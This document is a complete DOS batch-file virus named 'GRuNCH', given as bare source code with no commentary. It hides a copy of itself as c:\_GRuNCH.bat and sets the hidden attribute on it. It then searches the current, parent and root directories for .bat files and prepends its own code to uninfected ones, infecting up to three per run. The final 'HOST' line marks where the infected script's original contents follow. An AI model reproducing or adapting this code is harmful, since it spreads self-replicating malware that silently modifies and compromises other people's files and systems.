@echo off%_GRuNCH%
if '%1=='GRuNCH goto GRuNCH%2
set GRuNCH=%0.bat
if not exist %GRuNCH% set GRuNCH=%0
if '%GRuNCH%==' set GRuNCH=autoexec.bat
if exist c:\_GRuNCH.bat goto GRuNCHg
if exist %GRuNCH% goto GRuNCHfe
call %GRuNCH% GRuNCH h %path%
if exist %GRuNCH% goto GRuNCHfe
goto eGRuNCH
:GRuNCHh
shift%_GRuNCH%
if '%2==' goto GRuNCHxt
if exist %2\%GRuNCH% set GRuNCH=%2\%GRuNCH%
if exist %2%GRuNCH% set GRuNCH=%2%GRuNCH%
if exist %2\%GRuNCH%.bat set GRuNCH=%2\%GRuNCH%.bat
if exist %2%GRuNCH%.bat set GRuNCH=%2%GRuNCH%.bat
if not exist %GRuNCH% goto GRuNCHh
goto GRuNCHxt
:GRuNCHfe
find "GRuNCH"<%GRuNCH%>c:\_GRuNCH.bat
attrib c:\_GRuNCH.bat +h
:GRuNCHg
command /e:5000 /c c:\_GRuNCH GRuNCH vir
:eGRuNCH
set GRuNCH=
if exist !!GRuNCH.bat del !!GRuNCH.bat
goto GRuNCHend
:GRuNCHxt
echo.>!!GRuNCH.bat
!!GRuNCH.bat
:GRuNCHvir
for %%a in (*.bat ..\*.bat c:*.bat) do call c:\_GRuNCH GRuNCH i %%a
exit GRuNCH
:GRuNCHi
find "GRuNCH"<%3>nul
if not errorlevel 1 goto GRuNCHj
type c:\_GRuNCH.bat>GRuNCH$
type %3>>GRuNCH$
move GRuNCH$ %3>nul
set GRuNCH#=%GRuNCH#%1
if %GRuNCH#%==111 exit
:GRuNCHj
set GRuNCH!=%GRuNCH!%1
if %GRuNCH!%==111 exit
:GRuNCHend
::**** HOST ****
